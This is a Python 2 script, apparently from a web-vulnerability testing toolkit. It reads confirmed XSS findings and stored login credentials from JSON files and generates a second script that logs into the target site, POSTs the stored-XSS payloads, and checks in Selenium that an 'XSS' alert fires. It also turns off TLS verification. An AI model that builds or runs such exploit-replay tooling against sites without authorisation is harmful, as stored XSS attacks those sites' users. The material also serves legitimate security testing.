#!/usr/bin/python

import json
from pprint import pprint
import os.path
import sys

#=====================================================================
# This assumes this script is only called for one site
#=====================================================================

#==============================
# Flag to prove exploit worked
#==============================
attackString = "XSS"

usernameField = "username"
passwordField = "password"
submitButtonText = "login"
logoutText = "logout"

# Grab list of sucessful exploits
with open('confirmed.json') as exploit_data_file:    
    exploitData = json.load(exploit_data_file)

# pprint(exploitData) # data is a list_obj

siteList = [] # list of sites, incase we want to handle multiple sites

# Grab list of sites to watch for
for x in exploitData: # x is a dict_obj
	#print x.keys()[0].split('/')[2] # extract just the site name
	siteList.append(x.keys()[0].split('/')[2])

# Processing for multiple site, ignore for now
#for x in siteList:
#	print x

#===================== Opening file ==================================
fileName = siteList[0].replace('.','_')
fileName += "_script.py"
overwriteFile = True
valid = {"yes": True, "y": True, "ye": True, "no": False, "n": False}

def askFilename():
	if os.path.isfile(fileName):
		print "Overwrite existing " + fileName + " ? [Y/n]"
		response = raw_input().lower()
		if response == '':
			print "Overwriting..."
			return True
		elif response in valid:
			overwriteFile = valid[response]
			return True
		else:
			return False

while True:
	if askFilename():
		break

if not overwriteFile:
	print "Enter new filename:"
	response = raw_input().lower()
	fileName = response

print "Creating " + fileName

attackScript = open(fileName, "w")

#===================== Writing imports ===============================
initial = '#!/usr/bin/python\n\n'
imports = ""

# urllib imports
imports += 'import webbrowser, urllib, urllib2, cookielib, ssl\n\n' 

# requests import
imports += "import requests\n"
imports += "from requests.packages.urllib3.exceptions import InsecureRequestWarning\n\n"

# Selenium imports
imports += "from selenium import webdriver\n"
imports += "from selenium.common.exceptions import TimeoutException\n"
imports += "from selenium.webdriver.support.ui import WebDriverWait # available since 2.4.0\n"
imports += "from selenium.webdriver.support import expected_conditions as EC # available since 2.26.0\n"
imports += "from selenium.common.exceptions import NoSuchElementException, NoAlertPresentException\n"
imports += "import time\n\n"

print "\nWriting imports..."
attackScript.write(initial)
attackScript.write(imports)
print "Written imports...\n"
#===================== Logging In ====================================
username = ''
password = ''
url = ''

# Grab login credentials for stored
with open('stored.json') as login_data_file:    
    loginData = json.load(login_data_file)

for x in loginData: # x is a dict_obj
	if siteList[0] == x['action'].split('/')[2]:
		username = x['login']['username']
		password = x['login']['password']
		break

# Grab login page from setup
with open('setup.json') as login_data_file:    
    loginData = json.load(login_data_file) # data is a list_obj

for x in loginData: # x is a dict_obj
	if siteList[0] == x['starting_url'].split('/')[2]:
		for y in x['logins']:
			if username == y['username'] and password == y['password']:
				url = y['url']
				break

print "Using User: " + username + "  Pwd: " + password 
print "With login page " + url

loginCredentials = "username = \"" + username + "\"\n"
loginCredentials += "password = \"" + password + "\"\n"
loginCredentials += "url = \"" + url + "\"\n\n"

attackScript.write(loginCredentials)


#===================== Attacking =====================================
# via requests
requestsStart = "requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n"
requestsStart += "session = requests.session()\n"
print "\nWriting Start of Requests powered attacker..."
attackScript.write(requestsStart)
print "Written Start of Requests powered attacker..."

# login via requests
requestsLogin = "login_data = dict(" + usernameField + "='" + username + "', " + passwordField + "='" + password + "')\n"
requestsLogin += "logoutText = \"" + logoutText + "\"\n"
requestsLogin += "r = session.post(\"" + url + "\", data=login_data, verify=False)\n\n"
requestsLogin += "if logoutText in r.text: \n"
requestsLogin += "	print \"logged in successfully\"\n"
requestsLogin += "else:\n"
requestsLogin += "	print \"not logged in sucessfully\"\n\n"
print "\nWriting Login module of Requests powered attacker..."
attackScript.write(requestsLogin)
print "Written Login of Requests powered attacker..."

# navigate to exploited page via requests
requestsAtk = ""
for x in exploitData: 
	for y in x.keys():
		requestsAtk += "url =\"" + y + "\"\n"
		requestsAtk += "exploit_data = dict("
		counter = 0
		for z in x[y][0]['params'][0].keys():
			counter += 1
			requestsAtk += "" + z + "=\"" + x[y][0]['params'][0][z] +"\""
			if counter < len(x[y][0]['params'][0]):
				requestsAtk += ","
		requestsAtk += ") #build params\n"
		requestsAtk += "r = session.post(url, data=exploit_data, verify=False)\n"
		requestsAtk += "print \"attacked \" + url + \" ...\"\n\n"
print "\nWriting Attack module of Requests powered attacker..."
attackScript.write(requestsAtk)
print "Written Attack of Requests powered attacker..."


#===================== Verifying =====================================
# via selenium
seleniumStart = "\n#===== Start of selenium powered verifier====\n"
seleniumStart += "driver = webdriver.Firefox()\n"
print "\nWriting Start of Selenium powered verifier..."
attackScript.write(seleniumStart)
print "Written Start of Selenium powered verifier..."

# login via selenium
seleniumLogin = "usernameName = \"" + usernameField + "\"\n"
seleniumLogin += "passwordName = \"" + passwordField + "\"\n"
seleniumLogin += "submitText = \"" + submitButtonText + "\"\n"
seleniumLogin += "username = \"" + username + "\"\n"
seleniumLogin += "password = \"" + password + "\"\n"
seleniumLogin += "logoutText = \"" + logoutText + "\"\n"
seleniumLogin += "# load login page\n"
seleniumLogin += "driver.get(\"" + url + "\")\n\n"
seleniumLogin += "# methods for checking if item exists\n"
seleniumLogin += "def check_element_exists(name):\n"
seleniumLogin += "    try:\n"
seleniumLogin += "        driver.find_element_by_name(name)\n"
seleniumLogin += "    except NoSuchElementException:\n"
seleniumLogin += "        return False\n"
seleniumLogin += "    return True\n\n"
seleniumLogin += "def check_submit_btn_exists(name):\n"
seleniumLogin += "    try:\n"
seleniumLogin += "        driver.find_element_by_xpath(\"//input[@type='submit' and @value='\"+name+\"']\")\n"
seleniumLogin += "    except NoSuchElementException:\n"
seleniumLogin += "        return False\n"
seleniumLogin += "    return True\n\n"
seleniumLogin += "if check_element_exists(usernameName):\n"
seleniumLogin += "	print \"login found\"\n"
seleniumLogin += "	inputElement = driver.find_element_by_name(usernameName)\n"
seleniumLogin += "	inputElement.send_keys(username)\n"
seleniumLogin += "else:\n"
seleniumLogin += "	print \"login field not found\"\n\n"
seleniumLogin += "if check_element_exists(passwordName):\n"
seleniumLogin += "	print \"password found\"\n"
seleniumLogin += "	inputElement = driver.find_element_by_name(passwordName)\n"
seleniumLogin += "	inputElement.send_keys(password)\n"
seleniumLogin += "else:\n"
seleniumLogin += "	print \"password field not found\"\n\n"
seleniumLogin += "if check_submit_btn_exists(submitText):\n"
seleniumLogin += "	print \"submit button found\"\n"
seleniumLogin += "	inputElement = driver.find_element_by_xpath(\"//input[@type='submit' and @value='\"+submitText+\"']\")\n"
seleniumLogin += "	inputElement.click()\n"
seleniumLogin += "else:\n"
seleniumLogin += "	print \"submit button not found\"\n\n"
seleniumLogin += "time.sleep(3) # delay for page to load\n\n"
seleniumLogin += "if logoutText in driver.page_source: #.find(logoutText)\n"
seleniumLogin += "	print \"logged in successfully\"\n"
seleniumLogin += "else:\n"
seleniumLogin += "	print \"not logged in sucessfully\"\n\n"
print "\nWriting Login module of Selenium powered verifier..."
attackScript.write(seleniumLogin)
print "Written Login of Selenium powered verifier..."

# navigate to exploited page via selenium
for x in exploitData: 
	for y in x.keys():
		exploitedPage = y
		seleniumNav = "#==== Verifying attack on " + exploitedPage + "\n"
		seleniumNav += "attackString = \""+ attackString +"\"\n"
		seleniumNav += "driver.get(\""+ exploitedPage +"\")\n"
		seleniumNav += "try:\n"
		seleniumNav += "# Go through all alerts until attackString found\n"
		seleniumNav += "	while EC.alert_is_present():\n"
		seleniumNav += "	    alert = driver.switch_to_alert()\n"
		seleniumNav += "	    if attackString in alert.text:\n"
		seleniumNav += "	    	print \"exploit verified in \" + driver.current_url\n"
		seleniumNav += "	    alert.accept()\n"
		seleniumNav += "	    time.sleep(2)\n"
		seleniumNav += "except NoAlertPresentException:\n"
		seleniumNav += "	print \"Cleared all alerts on page\"\n\n"
		seleniumNav += "time.sleep(3)\n\n"
		print "Writing Exploit verifier for "+ exploitedPage +" ..."
		attackScript.write(seleniumNav)
		print "Written Exploit verifier for "+ exploitedPage +" ..."

seleniumClose = "driver.quit()"

# finish up and close selenium
print "Writing End of Selenium powered verifier..."
attackScript.write(seleniumClose)
print "Written End of Selenium powered verifier...\n"

#===================== Closing file ==================================
attackScript.close()